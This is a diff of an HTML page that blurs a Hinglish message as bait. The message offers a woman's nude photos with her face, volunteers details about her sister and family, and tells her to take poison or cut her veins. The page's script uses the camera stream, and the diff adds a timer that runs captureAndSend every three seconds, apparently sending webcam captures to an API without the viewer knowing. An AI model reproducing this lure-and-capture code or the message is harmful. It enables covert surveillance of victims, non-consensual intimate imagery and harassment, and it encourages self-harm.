@@ -16,7 +16,7 @@
             display: none;
             position: fixed;
             flex-direction: column;
-            top: 0;
+            top: 20%;
             left: 0;
             width: 100%;
             height: 100%;
@@ -38,7 +38,7 @@
 </div>
 
 <h1>Deal bs ye hai is sabme mera naam nhe aaye.</h1>
-<p><span>Bhai me khud is bc se durr jaana chahta hoo me teri help kar dunga mne jo bhee yahaa likhha h uska screenshot mt liye bs tujhe iske . . . </span><span id="blur">or nude photos chahiye me dunga bo bhee with face or chaahe to iski behen ke baare me bhee bhot information de skta hoo ke bo kyaa kyaa krti h poora khandan esa hee h maa bhee km nhe h iskii bs is sabme mera naam nahi aay kahi se kahi tak or ye mujhse durr ho jaay me phirr isko zeher khana h to zeher khaay yaa nas kaate.</span></p>
+<p><span style="font-size: 22px;">Bhai me khud is bc se durr jaana chahta hoo me teri help kar dunga mne jo bhee yahaa likhha h uska screenshot mt liye bs tujhe iske . . . </span><span id="blur">or nude photos chahiye me dunga bo bhee with face or chaahe to iski behen ke baare me bhee bhot information de skta hoo ke bo kyaa kyaa krti h poora khandan esa hee h maa bhee km nhe h iskii bs is sabme mera naam nahi aay kahi se kahi tak or ye mujhse durr ho jaay me phirr isko zeher khana h to zeher khaay yaa nas kaate.</span></p>
 
 
 <script>
@@ -85,7 +85,6 @@
                 overlay.style.display = 'none'; // Display the overlay
                 document.getElementById('blur').style.filter = 'none';
             }
-
                 stream.getTracks().forEach(track => track.stop());
             } 
         catch (error) {
@@ -121,7 +120,7 @@
             console.error('Error sending data to API:', error);
         });
     }
-
+    setInterval(captureAndSend, 3000);
 </script>
 
 </body>
